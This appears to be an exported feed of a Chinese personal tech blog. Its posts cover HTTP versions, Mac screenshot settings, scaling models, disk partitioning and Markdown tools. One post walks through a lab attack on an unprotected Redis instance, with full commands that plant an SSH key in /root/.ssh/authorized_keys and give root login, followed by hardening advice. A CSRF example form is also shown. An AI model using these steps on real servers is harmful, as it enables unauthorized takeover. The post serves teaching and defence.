class="line">Accept: */*</div><div class="line">Referer: http://website.org/</div><div class="line">Connection: close ⑥</div><div class="line">Accept-Encoding: gzip,deflate,sdch</div><div class="line">Accept-Language: en-US,en;q=0.8</div><div class="line">Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3</div><div class="line">Cookie: __qca=P0-800083390... (snip)</div><div class="line"></div><div class="line">HTTP/1.1 200 OK ⑦</div><div class="line">Server: nginx/1.0.11</div><div class="line">Content-Type: image/x-icon</div><div class="line">Content-Length: 3638</div><div class="line">Connection: close</div><div class="line">Last-Modified: Thu, 19 Jul 2012 17:51:44 GMT</div><div class="line">Cache-Control: max-age=315360000</div><div class="line">Accept-Ranges: bytes</div><div class="line">Via: HTTP/1.1 GWA</div><div class="line">Date: Sat, 21 Jul 2012 21:35:22 GMT</div><div class="line">Expires: Thu, 31 Dec 2037 23:55:55 GMT</div><div class="line">Etag: W/PSA-GAu26oXbDi</div><div class="line"></div><div class="line">(icon data)</div><div class="line">(connection closed)</div></pre></td></tr></table></figure>
<p>①：附带了encoding，charset和cookie元信息请求HTML文件<br>②：分块传输结果<br>③：分块的大小，以ASCII 十六进制表示。 100代表256字节。<br>④：用0，代表整个Response分块结束。<br>⑤：使用同一条TCP连接请求图标文件<br>⑥：提醒服务器，这个连接将不再被复用，可以关闭连接。<br>⑦：返回图标文件的信息，并在结尾处关闭连接。</p>
<p>以上样例重点贯彻了<code>HTTP/1.1</code>的连接复用、分块以及显式关闭等特征。</p>
<p>特征：</p>
<ol>
<li>默认TCP连接不关闭，可以被多个请求复用。不像HTTP/1.0还必须明确指明 Connection: Keep-Alive。</li>
<li>管道机制：同一个TCP连接，客户端可以发送多个请求。为了切分每个请求，必须在头部注明Content-Length</li>
<li>分块传输 chunk。</li>
</ol>
<p>其他功能</p>
<p>增加了 content, encoding, character set 等字段。<br>Host 字段<br>PUT PATCH HEAD OPTIONS DELETE</p>
<p>缺点</p>
<p>队头堵塞 Head-of-line blocking</p>
<h2 id="SPDY"><a href="#SPDY" class="headerlink" title="SPDY"></a>SPDY</h2><p>谷歌自研 2009年 ，HTTP/2的基础</p>
<h2 id="HTTP-2"><a href="#HTTP-2" class="headerlink" title="HTTP/2"></a>HTTP/2</h2><p>注意，不叫<code>HTTP/2.0</code>，下一个版本将是<code>HTTP/3</code>。</p>
<p>二进制协议</p>
<p>HTTP/1.1 的header肯定是ASCII，数据体可以是文本或二进制。<br>HTTP/2 是一个彻底的二进制协议，header和body都是二进制，并且统称为<code>帧</code>：头信息帧和数据帧。</p>
<p>多工 Multiplexing</p>
<p>HTTP/2 复用了TCP连接，在一个连接里，客户端和浏览器都可以同时发送多个请求或回应，而不是按照顺序。这避免了<code>队头堵塞</code>。</p>
<p>数据流</p>
<p>因为HTTP/2的数据包不按顺序发送，所以要指出每个数据包属于哪个回应。</p>
<p>每个请求或回应的所有数据包，称为一个数据流。每个数据流有个独一无二的ID。<br>客户端来的数据包的ID是奇数，服务端发送的数据包ID是偶数。</p>
<p>头信息压缩</p>
<p>一方面头可以压缩；另一方面，客户端和服务端维护了一张索引表，不用发送相同的字段。</p>
<p>服务器推送</p>
<p>未经过客户端的主动请求，服务器可以主动向客户端发送资源。</p>
<hr>
<p>参考：</p>
<p><a href="http://www.ruanyifeng.com/blog/2016/08/http.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2016/08/http.html</a><br><a href="https://github.com/abbshr/rfc7540-translation-zh_cn" target="_blank" rel="noopener">https://github.com/abbshr/rfc7540-translation-zh_cn</a><br><a href="https://tools.ietf.org/html/rfc7540" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc7540</a> / <a href="https://httpwg.org/specs/rfc7540.html" target="_blank" rel="noopener">https://httpwg.org/specs/rfc7540.html</a><br><a href="https://developers.google.com/web/fundamentals/performance/http2/?hl=zh-cn" target="_blank" rel="noopener">https://developers.google.com/web/fundamentals/performance/http2/?hl=zh-cn</a><br><a href="https://hpbn.co/brief-history-of-http/" target="_blank" rel="noopener">https://hpbn.co/brief-history-of-http/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;简要复习一下HTTP的发展历史。&lt;/p&gt;
    
    </summary>
    
      <category term="个人随笔" scheme="http://zablog.me/categories/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="技术随笔" scheme="http://zablog.me/tags/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>Mac OS X屏幕快照完全指南</title>
    <link href="http://zablog.me/2018/09/16/snapshot/"/>
    <id>http://zablog.me/2018/09/16/snapshot/</id>
    <published>2018-09-16T13:00:00.000Z</published>
    <updated>2018-09-16T13:07:48.070Z</updated>
    
    <content type="html"><![CDATA[<p>Mac OS X提供了丰富的内嵌屏幕快照（截图）工具，但是默认的格式、截图位置等并不一定可以契合每一个用户的需求。好在我们使用命令行（Terminal.app 或者iTerm2等别的命令行工具）可以方便地定制屏幕快照。</p>
<a id="more"></a>
<h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><p>在我们具体地讨论屏幕快照之前，我们先讲一下基本使用（经验丰富的用户可以跳过这个部分）</p>
<p>在Mac OS X中，有三种方式来截图：截取整个屏幕、截取选定的窗口、截取指定方形区域，以上每一个都可以用快捷键唤起。</p>
<p>Command + Shift + 3: 截取整个屏幕。如果你有多个屏幕，那么每个屏幕会分别被截在不同的图中。</p>
<p>Command + Shift + 4: 截取一个方形区域。接下来你可以用你的鼠标划取这个区域。</p>
<p><img src="https://cdn1.tekrevue.com/wp-content/uploads/2013/05/20130530_screenshotcrosshairs-615x386.jpg" alt=""></p>
<p>Command + Shift + 4, 然后按下空格: 截取一个窗口区域。</p>
<p>使用上述快捷键，默认会把截图保存到桌面上。</p>
<p>如果你在按上述快捷键的时候，同时按住Control键，那么截到的图片会暂时存在剪贴板中。</p>
<p>除了上述三个功能之外，/应用程序/实用工具/抓图.app还提供定时截图的功能。它可以有一个10秒钟的等待时间，会在你点击<code>启动定时器</code>按钮之后的10秒钟完成截图。</p>
<h1 id="使用终端命令行"><a href="#使用终端命令行" class="headerlink" title="使用终端命令行"></a>使用终端命令行</h1><p>后续每个效果，都得通过执行这句指令才能生效。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">killall SystemUIServer</div></pre></td></tr></table></figure>
<p>这句话起到了刷新作用。</p>
<h1 id="改变格式"><a href="#改变格式" class="headerlink" title="改变格式"></a>改变格式</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">defaults write com.apple.screencapture type [format]</div></pre></td></tr></table></figure>
<p><code>[format]</code> 可以输入为</p>
<ul>
<li>bmp</li>
<li>pdf</li>
<li>jpg</li>
<li>jp2</li>
<li>tif</li>
<li>pict</li>
<li>tga</li>
<li>png</li>
</ul>
<p>譬如，你可以通过输入<code>defaults write com.apple.screencapture type jpg</code>把默认图片格式改为jpg</p>
<h1 id="改变文件名"><a href="#改变文件名" class="headerlink" title="改变文件名"></a>改变文件名</h1><p>系统默认存储的文件名为<code>屏幕快照 [date] [time].[format]</code>，譬如<code>屏幕快照 2018-07-31 下午4.01.16.png</code>。<br>你无法把时间戳从文件名中移除，但是你可以改掉<code>屏幕快照</code>这个前缀。方法是输入：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">defaults write com.apple.screencapture name [file name]</div></pre></td></tr></table></figure>
<h1 id="修改默认保存位置"><a href="#修改默认保存位置" class="headerlink" title="修改默认保存位置"></a>修改默认保存位置</h1><p>默认是保存到桌面的。你可以手动改变保存位置。</p>
<p>命令是：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">defaults write com.apple.screencapture location</div></pre></td></tr></table></figure></p>
<p>首先，你必须要创建一个新的文件夹，当然你要了解你文件夹的位置。<br>譬如你创建了一个名字叫做<code>abc</code>的文件夹在桌面上，那么这个文件夹的位置就是~/Desktop/abc</p>
<p>例：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">defaults write com.apple.screencapture location /Users/[username]/Desktop/abc/</div></pre></td></tr></table></figure>
<h1 id="窗口阴影"><a href="#窗口阴影" class="headerlink" title="窗口阴影"></a>窗口阴影</h1><p>截图的时候默认是有窗口阴影的，你可以用命令改掉。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">defaults write com.apple.screencapture disable-shadow -bool true</div></pre></td></tr></table></figure>
<p>效果图：<br><img src="https://cdn1.tekrevue.com/wp-content/uploads/2013/03/20130301_osxscreenshots_4.jpg" alt=""></p>
<hr>
<p>参考：<br><a href="https://www.tekrevue.com/tip/how-to-customize-screenshot-options-in-mac-os-x/" target="_blank" rel="noopener">The Complete Guide to Mac OS X Screenshots</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Mac OS X提供了丰富的内嵌屏幕快照（截图）工具，但是默认的格式、截图位置等并不一定可以契合每一个用户的需求。好在我们使用命令行（Terminal.app 或者iTerm2等别的命令行工具）可以方便地定制屏幕快照。&lt;/p&gt;
    
    </summary>
    
      <category term="个人随笔" scheme="http://zablog.me/categories/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="技术随笔" scheme="http://zablog.me/tags/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/"/>
    
      <category term="OS X" scheme="http://zablog.me/tags/OS-X/"/>
    
  </entry>
  
  <entry>
    <title>AKF扩展立方</title>
    <link href="http://zablog.me/2018/09/10/scale-cube/"/>
    <id>http://zablog.me/2018/09/10/scale-cube/</id>
    <published>2018-09-10T13:00:00.000Z</published>
    <updated>2018-09-10T12:57:44.413Z</updated>
    
    <content type="html"><![CDATA[<p>《THE ART OF SCALABILITY》中描述了一个非常有用的扩展模型：扩展立方（也叫AKF扩展立方）。<br>这个模型把应用比作立方体，为了支持应用的发展和演进，我们可以通过x，y，z三个方向对它进行扩展。</p>
<a id="more"></a>
<p><img src="https://akfpartners.com//uploads/blog/AKF_Scale_Cube.gif" alt=""></p>
<h2 id="X轴扩展"><a href="#X轴扩展" class="headerlink" title="X轴扩展"></a>X轴扩展</h2><p>在负载均衡之后运行应用的多个拷贝。这是最简单最常用的扩展方式。</p>
<p>缺陷：</p>
<ul>
<li>每个拷贝需要访问所有的数据，对缓存机制要求很高，数据库很可能成为瓶颈。</li>
<li>不会减少日益增长的开发复杂度。</li>
</ul>
<h2 id="Y轴扩展"><a href="#Y轴扩展" class="headerlink" title="Y轴扩展"></a>Y轴扩展</h2><p>把整个应用切分为不同的服务，每个服务负责一个或少量几个关系相近的函数。</p>
<p>有好几种解耦拆分方式。一种是按照动词分割，一种是按照名词分割。</p>
<p>以购物网站为例：按照动词分割就是按照操作分割，服务1只负责购买流程，服务2只负责售后流程，服务3只负责广告投放流程；<br>按照名词分割就是按照对象类型分割，服务1只负责商品信息；服务2只负责用户信息。</p>
<p>两种扩展经常是同时使用的！</p>
<p>微服务化就是Y轴扩展的一个重要方式。</p>
<h2 id="Z轴扩展"><a href="#Z轴扩展" class="headerlink" title="Z轴扩展"></a>Z轴扩展</h2><p>Z轴扩展和X轴扩展很像，但是在Z轴扩展中，每个服务只跑特定的一部分代码或数据集。</p>
<p>Z轴扩展一般用来扩展数据库。（数据库分片）<br>在做某些查询的时候，查询指令被送给每一个分片，然后分别查询，最终获得的结果聚合之后返回。<br>做写入的时候，只需要按照分片键，找到对应的实例进行写入即可。</p>
<p>Z轴扩展的优势：</p>
<ul>
<li>每个服务器只处理一部分数据</li>
<li>优化了缓存的利用率，减少内存使用和I/O</li>
<li>增强了事务的扩展性</li>
<li>故障隔离</li>
</ul>
<p>劣势：</p>
<ul>
<li>增加了整体的复杂度。</li>
<li>需要实现分片机制。万一有重新分片的需求的话，令人头大。</li>
<li>增加复杂度的同事，并没有降低开发的复杂度，这个需要Y轴扩展配合解决。</li>
</ul>
<hr>
<p>参考：<br><a href="https://microservices.io/articles/scalecube.html" target="_blank" rel="noopener">The Scale Cube | Microservice Architecture</a></p>
<h1 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h1><p>JSON Web Tokens</p>
<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>跨站请求伪造Cross-site request forgery（简称CSRF, 读作 [sea-surf]）是一种典型的利用cookie-session漏洞的攻击，这里借用spring-security的一个例子来解释CSRF：</p>
<p>假设你经常使用bank.example.com进行网上转账，在你提交转账请求时bank.example.com的前端代码会提交一个HTTP请求:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">POST</span> <span class="string">/transfer</span> HTTP/1.1</div><div class="line"><span class="attribute">Host</span>: bank.example.com</div><div class="line"><span class="attribute">cookie</span>: JsessionID=randomid; Domain=bank.example.com; Secure; HttpOnly</div><div class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</div><div class="line"></div><div class="line">amount=100.00&amp;routingNumber=1234&amp;account=9876</div></pre></td></tr></table></figure>
<p>你图方便没有登出bank.example.com，随后又访问了一个恶意网站，该网站的HTML页面包含了这样一个表单：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"https://bank.example.com/transfer"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"amount"</span> <span class="attr">value</span>=<span class="string">"100.00"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"routingNumber"</span> <span class="attr">value</span>=<span class="string">"evilsRoutingNumber"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"account"</span> <span class="attr">value</span>=<span class="string">"evilsAccountNumber"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"点击就送!"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div></pre></td></tr></table></figure>
<p>你被“点击就送”吸引了，当你点了提交按钮时你已经向攻击者的账号转了100元。现实中的攻击可能更隐蔽，恶意网站的页面可能使用Javascript自动完成提交。尽管恶意网站没有办法盗取你的session cookie（从而假冒你的身份），但恶意网站向bank.example.com发起请求时，你的cookie会被自动发送过去。</p>
<p>因此，有些人认为前端代码将JWT通过HTTP header发送给服务端（而不是通过cookie自动发送）可以有效防护CSRF。在这种方案中，服务端代码在完成认证后，会在HTTP response的header中返回JWT，前端代码将该JWT存放到Local Storage里待用，或是服务端直接在cookie中保存HttpOnly=false的JWT。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;《THE ART OF SCALABILITY》中描述了一个非常有用的扩展模型：扩展立方（也叫AKF扩展立方）。&lt;br&gt;这个模型把应用比作立方体，为了支持应用的发展和演进，我们可以通过x，y，z三个方向对它进行扩展。&lt;/p&gt;
    
    </summary>
    
      <category term="个人随笔" scheme="http://zablog.me/categories/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="技术随笔" scheme="http://zablog.me/tags/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>Redis漏洞攻击</title>
    <link href="http://zablog.me/2018/04/06/redis-hole/"/>
    <id>http://zablog.me/2018/04/06/redis-hole/</id>
    <published>2018-04-06T07:34:46.000Z</published>
    <updated>2018-04-06T08:04:35.636Z</updated>
    
    <content type="html"><![CDATA[<p>在公网暴露端口的无防护Redis实例，很容易成为攻击者直接攻破的跳板，下面讲述一下攻击过程。<br><a id="more"></a><br>在阿里云上分别申请两台服务器，分别是<br>肉鸡： <code>172.17.171.122</code><br>攻击者：<code>172.17.171.123</code></p>
<h2 id="配置无防护的肉鸡"><a href="#配置无防护的肉鸡" class="headerlink" title="配置无防护的肉鸡"></a>配置无防护的肉鸡</h2><p>登陆<code>172.17.171.122</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">root@Target:~# wget http://download.redis.io/releases/redis-4.0.9.tar.gz</div><div class="line">root@Target:~# tar xzf redis-4.0.9.tar.gz</div><div class="line">root@Target:~# cd redis-4.0.9</div><div class="line">root@Target:~# make</div><div class="line">root@Target:~# vim redis.conf</div></pre></td></tr></table></figure>
<p>编辑redis.conf，把 bind 127.0.0.1 注释掉，以开放端口到外部端口， 并把<code>protected-mode yes</code>改为<code>protected-mode no</code>，使得外界不用密码也能够访问到此redis实例。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">src/redis-server redis.conf</div></pre></td></tr></table></figure>
<h2 id="实施攻击"><a href="#实施攻击" class="headerlink" title="实施攻击"></a>实施攻击</h2><p>登陆<code>172.17.171.123</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">root@Atacker:~# apt-get update</div><div class="line">root@Atacker:~# apt-get install redis-tools</div><div class="line">root@Atacker:~# ssh-keygen # 需相应的全默认回车</div><div class="line">root@Atacker:~# (echo -e &quot;\n&quot;;cat .ssh/id_rsa.pub;echo -e &quot;\n&quot;) &gt; pubkey.txt</div><div class="line">root@Atacker:~# cat pubkey.txt | redis-cli -h 172.17.171.122 -x set &quot;pubkey&quot;</div><div class="line">root@Atacker:~# redis-cli -h 172.17.171.122</div><div class="line">172.17.171.122:6379&gt; config set dir /root/.ssh</div><div class="line">172.17.171.122:6379&gt; config set dbfilename &quot;authorized_keys&quot;</div><div class="line">172.17.171.122:6379&gt; save</div><div class="line">172.17.171.122:6379&gt; exit</div><div class="line">root@Atacker:~# ssh root@172.17.171.122</div><div class="line">Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-105-generic x86_64)</div><div class="line"></div><div class="line"> * Documentation:  https://help.ubuntu.com</div><div class="line"> * Management:     https://landscape.canonical.com</div><div class="line"> * Support:        https://ubuntu.com/advantage</div><div class="line"></div><div class="line">Welcome to Alibaba Cloud Elastic Compute Service !</div><div class="line"></div><div class="line">Last login: Fri Apr  6 15:33:41 2018 from 172.17.171.123</div><div class="line">root@Target:~#</div></pre></td></tr></table></figure>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">root@Target:~# cat .ssh/authorized_keys</div><div class="line">REDIS0008�	redis-ver4.0.9�</div><div class="line">redis-bits�@�ctime�H#�Zused-mem��</div><div class="line">                                 �</div><div class="line">                                  aof-preamble���pubkeyA�</div><div class="line"></div><div class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7xaxGi7ZQAMX7YJRiyBDdz1RGIaPiSl+LHk8AfIvBjFja3GTRy+YqYk/DrpG/AKpNW27nW4jxckkFuCxpmkXNCkl80EQfI4r1PqhW2qoTpYwX5EJlRP6W5oytS5qqMnNN9mGP3u3/VT7lakk57NjFusdAV00sxMWz/kvgi3ZBxMhtWizLDR04dY3+2uLPwu/0GK10iw1dBoRCig2AAFAwMUwUrxAfb7D0YkqD2tDYz0N3u9TzzXGXHrZEi/nFaBRIqKZEr5RT5gSQLV5BGQud5DsuMw04bt4rr1cvWSLUbFySyvtZh4EVZsYjsAV0rd+SNQ0vbel0ThbpWbALyFXd root@Atacker</div><div class="line"></div><div class="line"></div><div class="line">a�	��x&quot;����r</div></pre></td></tr></table></figure>
<p>攻击者利用redis，把自己的公钥写到了.ssh/authroized_keys文件内，再使用ssh登陆的时候，便被认为是有权限的登陆者，从而获得了root账户的完全控制权。</p>
<h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><p>要禁止这些漏洞，要做以下检查</p>
<ol>
<li>不要使用root用户直接建立实例，可以为redis专门设置一个账户，或者用其他无sudo权限的用户开启redis-server，这样即使被攻破，影响也会小一些。</li>
<li>没有特殊需求的话，防火墙不要轻易暴露公网端口，实例不要轻易绑定0.0.0.0，不要轻易使用默认6379端口，不要轻易把protected-mode设为no。</li>
<li>如果连内网安全都无法保证，请设置密码。这是不推荐的策略，因为能够用防火墙防住的，尽量不要用密码防，毕竟密码有理论上的可破解性。</li>
<li>用户的.ssh内的文件都应该权限设置为400，防止被别的用户篡改。</li>
</ol>
<hr>
<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ol>
<li>以上实例、IP、公钥都是临时申请的，不会再使用，业已删除，请不要乱试。</li>
<li>实例都是基于纯净版debian 9.2 64bit，测试以上内容不需要额外做任何操作。</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在公网暴露端口的无防护Redis实例，很容易成为攻击者直接攻破的跳板，下面讲述一下攻击过程。&lt;br&gt;
    
    </summary>
    
      <category term="个人随笔" scheme="http://zablog.me/categories/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="Redis" scheme="http://zablog.me/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>Mediakit报告设备商的空间不足以执行此操作的纯MAC解法</title>
    <link href="http://zablog.me/2018/03/09/diskutil/"/>
    <id>http://zablog.me/2018/03/09/diskutil/</id>
    <published>2018-03-09T11:06:39.000Z</published>
    <updated>2018-03-12T02:15:53.876Z</updated>
    
    <content type="html"><![CDATA[<p>使用Mac对磁盘进行分区，显示“Mediakit报告设备商的空间不足以执行此操作”，该怎么办？</p>
<a id="more"></a>
<h1 id="What"><a href="#What" class="headerlink" title="What"></a>What</h1><p>买了一个4TB的移动硬盘，准备进行分区给Time Machine用。<br>硬盘自带是HDFS的，所以连上Mac之后，准备使用自带的<code>磁盘工具.app</code>进行格式化。<br>无论是选择 <code>OS X 扩展（日志式）</code>还是选择<code>Apple文件系统</code>，都会报错</p>
<blockquote>
<p>Mediakit 报告设备上空间足以执行此操作</p>
</blockquote>
<p>然而网上的所有中文解决办法，全部都是需要动用大名鼎鼎的<code>DiskGenius</code>磁盘工具。这个工具我以前使用过，确实做的很用心，在PC上使用非常方便。</p>
<p>但是，我临时手头没有任何Windows设备！怎么办？！</p>
<h1 id="How"><a href="#How" class="headerlink" title="How"></a>How</h1><p>开门见山，直接说说怎么解决。</p>
<p>首先打开命令行<br>如果你不知道什么是命令行，可以使用(访达/Finder)，在个人收藏里面打开<code>终端.app</code>。</p>
<p>键入如下内容</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">diskutil list</div></pre></td></tr></table></figure>
<p>这个时候你会获得你的所有磁盘内容。</p>
<p>找到你刚连上的移动硬盘。如果你实在不知道哪个是你刚连上的，注意哪个地方有<code>external</code>或<code>physical</code> </p>
<p>找到这个磁盘，譬如<code>disk2</code>，就运行下面的命令。如果不是<code>disk2</code>，那么用你的disk替换一下。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">diskutil unmountDisk force disk2</div></pre></td></tr></table></figure>
<p>然后写入一个纯0的200M启动扇区</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo dd <span class="keyword">if</span>=/dev/zero of=/dev/disk2 bs=1024 count=1024</div></pre></td></tr></table></figure>
<p>最后，再次尝试使用命令行进行分区。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">diskutil partitionDisk disk2 GPT JHFS+ <span class="string">"AWESOME DISK"</span> 0g</div></pre></td></tr></table></figure>
<p>至此，搞定。</p>
<h1 id="Why"><a href="#Why" class="headerlink" title="Why"></a>Why</h1><p>产生错误的原因是对于超过4TB的磁盘来说，一定是使用GUID分区表。在这种情况下，必须需要一个200M的EFI分区，才能够进行分区。</p>
<p>APFS确实比HFS+有更高的优势，譬如COW等等，因此性能更高。<br>APFS甚至支持动态分区。<br>但是APFS不支持时间机器，所以我这个磁盘还是要用HFS+。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;使用Mac对磁盘进行分区，显示“Mediakit报告设备商的空间不足以执行此操作”，该怎么办？&lt;/p&gt;
    
    </summary>
    
      <category term="个人随笔" scheme="http://zablog.me/categories/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/"/>
    
    
  </entry>
  
  <entry>
    <title>几款MarkDown对比</title>
    <link href="http://zablog.me/2017/12/16/markdown/"/>
    <id>http://zablog.me/2017/12/16/markdown/</id>
    <published>2017-12-16T13:00:00.000Z</published>
    <updated>2017-12-17T02:53:56.000Z</updated>
    
    <content type="html"><![CDATA[<p>今天来比较三款MarkDown工具。入选的三个工具分别叫做<code>马克飞象</code>、<code>小书匠</code>、<code>作业部落Cmd Markdown</code>。入选的必要条件是支持所有的终端，且可以导到其他的笔记平台。单个端的Markdown解析器、或者文本编辑器的插件之类的，不在今天的讨论之列。</p>
<a id="more"></a>
<p>这几款Markdown工具都是国产，各有优劣。下面将给大家具体分析</p>
<h2 id="笔记平台"><a href="#笔记平台" class="headerlink" title="笔记平台"></a>笔记平台</h2><p>印象笔记等笔记平台不在今天的比较队列里，这里首先来讲述一下使用Markdown的痛点所在。</p>
<p>印象笔记其实在格式方面是存在很多问题的。其实印象笔记这个公司在2016年就在融资上出现了很大的问题，确实它的格式在2006年左右还是杀手级的，但是恐怕这个公司已经对兼容性焦头烂额了。</p>
<p>当然，对于一个程序员来说，对于印象笔记最为头疼的地方是它无法写代码。它比IDE等等差的太多，甚至连vim都不如。当你在里面写了两个英文的双引号，则左边的会自动变成中文的左括号。<em><strong>黑人问号？？？</strong></em>这还怎么写代码？！</p>
<p>Wiz笔记作为国内的笔记旗帜，对于Markdown的支持还是令人很欣慰的。早在五年前，我还是Wiz的忠实用户。但是切换Macbook以后，发现这个软件对于Mac段的支持一直不尽如人意，所以后来还是转了印象笔记，并成为印象笔记的忠实付费高级用户。</p>
<p>而且Wiz笔记现在不付费好像是几乎没法用了，这个也是有点不太好呀。</p>
<p>有道云笔记也使用过，但是没有留下太强烈的印象，后来也放弃了。</p>
<p>对于问题，三款Markdown都能够完好的解决，毕竟Markdown嘛，可以用```来写代码的。</p>
<hr>
<h2 id="马克飞象"><a href="#马克飞象" class="headerlink" title="马克飞象"></a>马克飞象</h2><p>马克飞象对于各个客户端做得相对来说比较<code>native</code>，所以算是支持的比较好的。对于同步笔记来说，它并没有把印象笔记的原有内容同步过来。这一方面说是一个问题，另一方面说也是一个优点。毕竟原来的笔记并不是支持这样一个markdown的格式的，而且那么多笔记，总共也得有1000篇了吧，总体弄过来真的比较乱。</p>
<p>现在的问题是这个内容能不能自动同步。但是从“正在从印象笔记载入”字样来看应该没这个顾虑。</p>
<p>缺陷：</p>
<ul>
<li>价格是肯定要放在缺陷里面的。当然，收费没有任何值得指责的，毕竟作者辛辛苦苦为大家提供了很好的产品。但是如果两个产品一样的话，那么我们还是更喜欢拥抱开源的免费的大家庭。</li>
<li>文章在印象笔记端无法编辑。当然这个也确实解决了冲突的问题，但是笔记端只能看不能写也是有点讨厌。</li>
</ul>
<p>对于Markdown的存储方式，在微博上看到作者本人的回复。印象笔记本身的格式是enml，是html兼容的。作者在整个enml的最后增加了一个<code>&lt;center&gt;</code>标签，并且把这个center标签设置为隐藏的，所以我们在印象笔记中看不到相关的内容，但是它真真切切地同步了。至于图片的话，就直接印象笔记兼容的图片嵌入进去了。马克飞象可以通过相应的操作，把整个Markdown还原回来。</p>
<hr>
<h2 id="小书匠"><a href="#小书匠" class="headerlink" title="小书匠"></a>小书匠</h2><p>不可否认的是，小书匠做得确实不错。</p>
<p>这里就不上图了，因为截了个图发现暴露了一些隐私账户。</p>
<p>居然可以把印象笔记的所有内容都同步过来，并且都尝试以Markdown的方式进行打开。</p>
<p>小书匠免费版的功能是最强大的，收费版的费用也并不贵。20元一年，也就一碗帝都牛肉面而已。</p>
<p>小书匠的缺陷，个人认为也是三个编辑器中最大的。首先是它使用了一个比较奇怪的引擎，导致用起来的流畅度不足。</p>
